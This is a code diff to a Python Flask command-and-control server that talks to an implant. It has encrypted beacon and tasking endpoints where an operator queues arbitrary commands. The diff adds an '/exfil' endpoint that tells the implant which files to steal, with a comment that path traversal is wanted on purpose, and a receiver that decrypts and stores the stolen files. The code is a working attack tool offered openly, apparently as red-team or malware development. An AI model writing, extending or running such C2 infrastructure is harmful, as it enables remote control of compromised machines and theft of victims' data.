@@ -1,11 +1,10 @@
 """Command and Control HTTP server for communicating with implant"""
 
-# TODO: change eval to json
-
 import base64
 import os
 import json
-from time import time
+import time
+
 from flask import Flask, request, jsonify
 from werkzeug.utils import secure_filename
 from cryptography.hazmat.primitives.asymmetric import x25519
@@ -26,10 +25,10 @@ UPLOAD_FOLDER = "uploads"
 derived_key = None
 
 
-def encrypt_data(aes_key: bytes, plaintext: str | bytes) -> bytes:
+def encrypt_data(aes_key: bytes, plaintext: bytes | str) -> bytes:
     """Encrypt data using AES-256-GCM with nonce and encode with base64"""
     if isinstance(plaintext, str):
-        plaintext = plaintext.encode()
+        plaintext = plaintext.encode("utf-8")
 
     aesgcm = AESGCM(aes_key)
     nonce = os.urandom(12)
@@ -103,8 +102,7 @@ def beacon():
         return encrypt_data(pre_shared_key, server_public_bytes)
 
     # else send task
-    json_str = json.dumps({"tasks": tasks})
-    response = encrypt_data(derived_key, json_str.encode("utf-8"))
+    response = encrypt_data(derived_key, json.dumps({"tasks": tasks}))
     # clear after sending
     tasks.clear()
     return response
@@ -114,6 +112,7 @@ def beacon():
 def task():
     # operator calls this endpoint with "cmd" (str) param to add task
     # implant receives tasks when pinging BEACON_ENDPOINT
+    # implant uploads results to RESULTS_ENDPOINT
     data = request.json
     print("[*] TASKS\n", data)
     command: str = data.get("cmd")
@@ -127,23 +126,54 @@ def task_result():
     # implant uses this endpoint to upload results of tasks
     enc = request.get_data().decode()
     plain = decrypt_data(derived_key, enc)
-    print("[*] RESULT\n", plain)
-    json_data = eval(plain)
+    json_data = json.loads(plain)
+    print("[*] RESULT\n", json_data)
 
-    output = json_data.get("result")
-    results.append(output)
-    return encrypt_data(derived_key, "ok")
+    result = json_data.get("result")
+    results.append(result)
+    return "", 200
 
 
-@app.route("/task", methods=["POST"])
-def task():
-    # operator calls this endpoint with "cmd" param to add task
+@app.route("/exfil", methods=["POST"])
+def queue_exfil():
+    # operator calls this with "files" (list[str]) param to tell implant which files to exfiltrate
+    # implant will respond to FILE_ENDPOINT
     data = request.json
-    print("DATA\n", data)
-    command = data.get("cmd")
+    files = data.get("files")
 
-    tasks.append(command)
-    return jsonify({"status": "task added"})
+    # allow inputting single files
+    if isinstance(files, str):
+        files = [files]
+    # ensure files is list[str]
+    if (not files or not isinstance(files, list)) or (
+        files and not isinstance(files[0], str)
+    ):
+        return "[!] Request must include 'files' param as list[str]"
+
+    for filename in files:
+        # don't secure filename because we want file traversal
+        tasks.append(f"FILE {filename}")
+
+    return jsonify({"status": f"{len(files)} files added"})
+
+
+@app.route(FILE_ENDPOINT, methods=["POST"])
+def recv_file():
+    # implant uses this endpoint to upload encrypted files in "files" field
+    # decrypted files are uploaded in UPLOAD_FOLDER with a timestamp appended
+    if "file" not in request.files:
+        return "", 400
+
+    enc_file = request.files.get("file")  # Flask FileStorage object
+    # decrypt file
+    file_bytes = decrypt_data(derived_key, enc_file.read(), False)
+
+    # upload to UPLOAD_FOLDER/filename_<timestamp>
+    filename = decrypt_data(derived_key, enc_file.filename)
+    sec_filename = secure_filename(filename + f"_{int(time.time())}")
+    with open(os.path.join(UPLOAD_FOLDER, sec_filename), "wb") as f:
+        f.write(file_bytes)
+    return "", 200
 
 
 @app.route("/destroy", methods=["POST"])
